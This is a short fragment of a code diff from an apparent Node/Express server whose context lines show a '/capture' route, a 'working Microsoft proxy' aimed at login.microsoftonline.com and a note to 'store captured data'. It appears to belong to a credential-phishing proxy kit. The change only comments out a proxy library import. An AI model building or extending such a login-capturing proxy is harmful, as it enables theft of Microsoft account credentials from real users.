@@ -1158,7 +1158,7 @@ app.post('/capture', express.urlencoded({ extended: true }), async (req, res) =>
 
 
 // ============= WORKING MICROSOFT PROXY =============
-const { createProxyMiddleware } = require('http-proxy-middleware');
+// const { createProxyMiddleware } = require('http-proxy-middleware');
 const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';
 
 // Store captured data
